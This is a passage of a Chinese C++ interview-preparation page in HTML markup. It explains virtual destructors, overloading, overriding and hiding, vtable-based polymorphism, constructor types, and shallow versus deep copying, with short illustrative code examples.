number">4.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Parent<span class="token operator">*</span> pp<span class="token punctuation">;</span>Child1<span class="token operator">*</span> pc1<span class="token punctuation">;</span> pp<span class="token operator">=</span><span class="token operator">&amp;</span>c1<span class="token punctuation">;</span> pc1<span class="token operator">=</span><span class="token punctuation">(</span>Child1<span class="token operator">*</span><span class="token punctuation">)</span>pp<span class="token punctuation">;</span>  <span class="token comment">// 类型向下转换 强制转换，由于类型仍然为Child1*，不造成错误</span>cout<span class="token operator">&lt;&lt;</span>pc1<span class="token operator">-></span>i<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//输出：5</span> pp<span class="token operator">=</span><span class="token operator">&amp;</span>c2<span class="token punctuation">;</span>pc1<span class="token operator">=</span><span class="token punctuation">(</span>Child1<span class="token operator">*</span><span class="token punctuation">)</span>pp<span class="token punctuation">;</span>  <span class="token comment">//强制转换，且类型发生变化，将造成错误</span>cout<span class="token operator">&lt;&lt;</span>pc1<span class="token operator">-></span>i<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">// 输出：1717986918</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>上面两个例子之所以引起类型不安全的问题，是因为程序员使用不得当。第一个例子用到了空类型指针void*，第二个例子则是在两个类型指针之间进行强制转换。因此，想保证程序的类型安全性，应尽量避免使用空类型指针void*，尽量不对两种类型指针做强制转换。</p><h4 id="33、为什么析构函数一般写成虚函数"><a href="#33、为什么析构函数一般写成虚函数" class="headerlink" title="33、为什么析构函数一般写成虚函数"></a>33、为什么析构函数一般写成虚函数</h4><p>由于类的多态性，基类指针可以指向派生类的对象，如果删除该基类的指针，就会调用该指针指向的派生类析构函数，而派生类的析构函数又自动调用基类的析构函数，这样整个派生类的对象完全被释放。如果析构函数不被声明成虚函数，则编译器实施静态绑定，在删除基类指针时，只会调用基类的析构函数而不调用派生类析构函数，这样就会造成派生类对象析构不完全，造成内存泄漏。所以将析构函数声明为虚函数是十分必要的。在实现多态时，当用基类操作派生类，在析构时防止只析构基类而不析构派生类的状况发生，要将基类的析构函数声明为虚函数。举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Parent<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parent construct function"</span>  <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">~</span><span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parent destructor function"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son <span class="token operator">:</span> public Parent<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Son construct function"</span>  <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">~</span><span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Son destructor function"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Parent<span class="token operator">*</span> p <span class="token operator">=</span> new <span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>delete p<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果：</span><span class="token comment">//Parent construct function</span><span class="token comment">//Son construct function</span><span class="token comment">//Parent destructor function</span></code></pre><p>将基类的析构函数声明为虚函数：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Parent<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parent construct function"</span>  <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>virtual <span class="token operator">~</span><span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parent destructor function"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son <span class="token operator">:</span> public Parent<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Son construct function"</span>  <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">~</span><span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Son destructor function"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Parent<span class="token operator">*</span> p <span class="token operator">=</span> new <span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>delete p<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果：</span><span class="token comment">//Parent construct function</span><span class="token comment">//Son construct function</span><span class="token comment">//Son destructor function</span><span class="token comment">//Parent destructor function</span></code></pre><h4 id="34、构造函数能否声明为虚函数或者纯虚函数，析构函数呢？"><a href="#34、构造函数能否声明为虚函数或者纯虚函数，析构函数呢？" class="headerlink" title="34、构造函数能否声明为虚函数或者纯虚函数，析构函数呢？"></a>34、构造函数能否声明为虚函数或者纯虚函数，析构函数呢？</h4><p>析构函数：</p><ul><li>析构函数可以为虚函数，并且一般情况下基类析构函数要定义为虚函数。</li><li>只有在基类析构函数定义为虚函数时，调用操作符delete销毁指向对象的基类指针时，才能准确调用派生类的析构函数（从该级向上按序调用虚函数），才能准确销毁数据。</li><li><strong>析构函数可以是纯虚函数</strong>，含有纯虚函数的类是抽象类，此时不能被实例化。但派生类中可以根据自身需求重新改写基类中的纯虚函数。</li></ul><p>构造函数：</p><ul><li>构造函数不能定义为虚函数。在构造函数中可以调用虚函数，不过此时调用的是正在构造的类中的虚函数，而不是子类的虚函数，因为此时子类尚未构造好。</li></ul><h4 id="35、c中的重载、重写（覆盖）和隐藏的区别"><a href="#35、c中的重载、重写（覆盖）和隐藏的区别" class="headerlink" title="35、c中的重载、重写（覆盖）和隐藏的区别"></a>35、c中的重载、重写（覆盖）和隐藏的区别</h4><p>（1）重载（overload）</p><p>重载是指在同一范围定义中的同名成员函数才存在重载关系。主要特点是函数名相同，参数类型和数目有所不同，不能出现参数个数和类型均相同，仅仅依靠返回值不同来区分的函数。重载和函数成员是否是虚函数无关。举个例子：</p><pre class="language-c" data-language="c"><code class="language-c">class A<span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    virtual <span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>（2）重写（覆盖）（override）</p><p>重写指的是在派生类中覆盖基类中的同名函数，<strong>重写就是重写函数体</strong>，<strong>要求基类函数必须是虚函数</strong>且：</p><ul><li>与基类的虚函数有相同的参数个数</li><li>与基类的虚函数有相同的参数类型</li><li>与基类的虚函数有相同的返回值类型</li></ul><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//父类</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    virtual <span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//子类</span>class B <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token comment">//重写,一般加override可以确保是重写父类的函数</span>    virtual <span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> override<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>重载与重写的区别：</p><ul><li>重写是父类和子类之间的垂直关系，重载是不同函数之间的水平关系</li><li>重写要求参数列表相同，重载则要求参数列表不同，返回值不要求</li><li>重写关系中，调用方法根据对象类型决定，重载根据调用时实参表与形参表的对应关系来选择函数体</li></ul><p>（3）隐藏（hide）</p><p>隐藏指的是某些情况下，派生类中的函数屏蔽了基类中的同名函数，包括以下情况：</p><ul><li>两个函数参数相同，但是基类函数不是虚函数。<strong>和重写的区别在于基类函数是否是虚函数。</strong>举个例子：</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//父类</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A中的fun函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//子类</span>class B <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token comment">//隐藏父类的fun函数</span>    <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"B中的fun函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    B b<span class="token punctuation">;</span>    b<span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用的是B中的fun函数</span>    b<span class="token punctuation">.</span>A<span class="token operator">::</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用A中fun函数</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li><strong>两个函数参数不同，无论基类函数是不是虚函数，都会被隐藏。和重载的区别在于两个函数不在同一个类中。举个例子：</strong></li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//父类</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    virtual <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A中的fun函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//子类</span>class B <span class="token operator">:</span> public A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token comment">//隐藏父类的fun函数</span>   virtual <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A中的fun函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    B b<span class="token punctuation">;</span>    b<span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//报错，调用的是B中的fun函数，参数类型不对</span>    b<span class="token punctuation">.</span>A<span class="token operator">::</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用A中fun函数</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="36、c的多态如何实现"><a href="#36、c的多态如何实现" class="headerlink" title="36、c的多态如何实现"></a>36、c的多态如何实现</h4><p>c的多态性，<strong>一言以蔽之</strong>就是：</p><p>在基类的函数前加上<strong>virtual</strong>关键字，在派生类中重写该函数，运行时将会根据所指对象的实际类型来调用相应的函数，如果对象类型是派生类，就调用派生类的函数，如果对象类型是基类，就调用基类的函数。</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Base::func()"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son1 <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> override<span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Son1::func()"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son2 <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Base<span class="token operator">*</span> base <span class="token operator">=</span> new Son1<span class="token punctuation">;</span>base<span class="token operator">-></span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>base <span class="token operator">=</span> new Son2<span class="token punctuation">;</span>base<span class="token operator">-></span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>delete base<span class="token punctuation">;</span>base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 运行结果</span><span class="token comment">// Son1::func()</span><span class="token comment">// Base::func()</span></code></pre><p>例子中，Base为基类，其中的函数为虚函数。子类1继承并重写了基类的函数，子类2继承基类但没有重写基类的函数，从结果分析子类体现了多态性，那么为什么会出现多态性，其底层的原理是什么？这里需要引出虚表和虚基表指针的概念。</p><p>虚表：虚函数表的缩写，类中含有virtual关键字修饰的方法时，编译器会自动生成虚表</p><p>虚表指针：在含有虚函数的类实例化对象时，对象地址的前四个字节存储的指向虚表的指针</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/微信截图_20210201114227.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/微信截图_20210201114257.png" alt=""></p><p><strong>上图中展示了虚表和虚表指针在基类对象和派生类对象中的模型，下面阐述实现多态的过程：</strong></p><p><strong>（1）</strong>编译器在发现基类中有虚函数时，会自动为每个含有虚函数的类生成一份虚表，该表是一个一维数组，虚表里保存了虚函数的入口地址</p><p><strong>（2）</strong>编译器会在每个对象的前四个字节中保存一个虚表指针，即<strong>vptr</strong>，指向对象所属类的虚表。在构造时，根据对象的类型去初始化虚指针vptr，从而让vptr指向正确的虚表，从而在调用虚函数时，能找到正确的函数</p><p><strong>（3）</strong>所谓的合适时机，在派生类定义对象时，程序运行会自动调用构造函数，在构造函数中创建虚表并对虚表初始化。在构造子类对象时，会先调用父类的构造函数，此时，编译器只“看到了”父类，并为父类对象初始化虚表指针，令它指向父类的虚表；当调用子类的构造函数时，为子类对象初始化虚表指针，令它指向子类的虚表</p><p><strong>（4）</strong>当派生类对基类的虚函数没有重写时，派生类的虚表指针指向的是基类的虚表；当派生类对基类的虚函数重写时，派生类的虚表指针指向的是自身的虚表；当派生类中有自己的虚函数时，在自己的虚表中将此虚函数地址添加在后面</p><p>这样指向派生类的基类指针在运行时，就可以根据派生类对虚函数重写情况动态的进行调用，从而实现多态性。</p><blockquote><p>《c实现多态的原理》：<a href="https://blog.csdn.net/qq_37954088/article/details/79947898">https://blog.csdn.net/qq_37954088/article/details/79947898</a></p></blockquote><h4 id="37、c有哪几种的构造函数"><a href="#37、c有哪几种的构造函数" class="headerlink" title="37、c有哪几种的构造函数"></a>37、c有哪几种的构造函数</h4><p>c中的构造函数可以分为4类：</p><ul><li>默认构造函数</li><li>初始化构造函数（有参数）</li><li>拷贝构造函数</li><li>移动构造函数（move和右值引用）</li><li>委托构造函数</li><li>转换构造函数</li></ul><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Student<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//默认构造函数，没有参数</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>        this<span class="token operator">-></span>num <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">age</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">num</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">//初始化构造函数，有参数和参数列表</span>    <span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">const</span> Student<span class="token operator">&amp;</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//拷贝构造函数，这里与编译器生成的一致</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> s<span class="token punctuation">.</span>age<span class="token punctuation">;</span>        this<span class="token operator">-></span>num <span class="token operator">=</span> s<span class="token punctuation">.</span>num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//转换构造函数,形参是其他类型变量，且只有一个形参</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> r<span class="token punctuation">;</span>this<span class="token operator">-></span>num <span class="token operator">=</span> <span class="token number">1002</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token operator">~</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Student s1<span class="token punctuation">;</span>    Student <span class="token function">s2</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">1001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    Student <span class="token function">s3</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    Student <span class="token function">s4</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s1 age:%d, num:%d\n"</span><span class="token punctuation">,</span> s1<span class="token punctuation">.</span>age<span class="token punctuation">,</span> s1<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s2 age:%d, num:%d\n"</span><span class="token punctuation">,</span> s2<span class="token punctuation">.</span>age<span class="token punctuation">,</span> s2<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s3 age:%d, num:%d\n"</span><span class="token punctuation">,</span> s3<span class="token punctuation">.</span>age<span class="token punctuation">,</span> s3<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s2 age:%d, num:%d\n"</span><span class="token punctuation">,</span> s4<span class="token punctuation">.</span>age<span class="token punctuation">,</span> s4<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果</span><span class="token comment">//s1 age:20, num:1000</span><span class="token comment">//s2 age:18, num:1001</span><span class="token comment">//s3 age:10, num:1002</span><span class="token comment">//s2 age:10, num:1002</span></code></pre><ul><li>默认构造函数和初始化构造函数在定义类的对象，完成对象的初始化工作</li><li>复制构造函数用于复制本类的对象</li><li>转换构造函数用于将其他类型的变量，隐式转换为本类对象</li></ul><blockquote><p>《浅谈c中的几种构造函数》：<a href="https://blog.csdn.net/zxc024000/article/details/51153743">https://blog.csdn.net/zxc024000/article/details/51153743</a></p></blockquote><h4 id="38、浅拷贝和深拷贝的区别"><a href="#38、浅拷贝和深拷贝的区别" class="headerlink" title="38、浅拷贝和深拷贝的区别"></a>38、浅拷贝和深拷贝的区别</h4><p><strong>浅拷贝</strong></p><p>浅拷贝只是拷贝一个指针，并没有新开辟一个地址，拷贝的指针和原来的指针指向同一块地址，如果原来的指针所指向的资源释放了，那么再释放浅拷贝的指针的资源就会出现错误。</p><p><strong>深拷贝</strong></p><p>深拷贝不仅拷贝值，还开辟出一块新的空间用来存放新的值，即使原先的对象被析构掉，释放内存了也不会影响到深拷贝得到的值。在自己实现拷贝赋值的时候，如果有指针变量的话是需要自己实现深拷贝的。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>using namespace std<span class="token punctuation">;</span> class Student<span class="token punctuation">&#123;</span>private<span class="token operator">:</span><span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>public<span class="token operator">:</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Student"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">~</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"~Student "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        delete name<span class="token punctuation">;</span>        name <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">const</span> Student <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//拷贝构造函数</span>        <span class="token comment">//浅拷贝，当对象的name和传入对象的name指向相同的地址</span>        name <span class="token operator">=</span> s<span class="token punctuation">.</span>name<span class="token punctuation">;</span>        <span class="token comment">//深拷贝</span>        <span class="token comment">//name = new char(20);</span>        <span class="token comment">//memcpy(name, s.name, strlen(s.name));</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"copy Student"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token comment">// 花括号让s1和s2变成局部对象，方便测试</span>Student s1<span class="token punctuation">;</span>Student <span class="token function">s2</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 复制对象</span><span class="token punctuation">&#125;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//浅拷贝执行结果：</span><span class="token comment">//Student</span><span class="token comment">//copy Student</span><span class="token comment">//~Student 0x7fffed0c3ec0</span><span class="token comment">//~Student 0x7fffed0c3ed0</span><span class="token comment">//*** Error in `/tmp/815453382/a.out': double free or corruption (fasttop): 0x0000000001c82c20 ***</span><span class="token comment">//深拷贝执行结果：</span><span class="token comment">//Student</span><span class="token comment">//copy Student</span><span class="token comment">//~Student 0x7fffebca9fb0</span><span class="token comment">//~Student 0x7fffebca9fc0</span></code></pre><p>从执行结果可以看出，浅拷贝在对象的拷贝创建时存在风险，即被拷贝的对象析构释放资源之后，拷贝对象析构时会再次释放一个已经释放的资源，深拷贝的结果是两个对象之间没有任何关系，各自成员地址不同。</p><blockquote><p>《c面试题之浅拷贝和深拷贝的区别》：<a href="https://blog.csdn.net/caoshangpa/article/details/79226270">https://blog.csdn.net/caoshangpa/article/details/79226270</a></p></blockquote><h4 id="39、内联函数和宏定义的区别"><a href="#39、内联函数和宏定义的区别" class="headerlink" 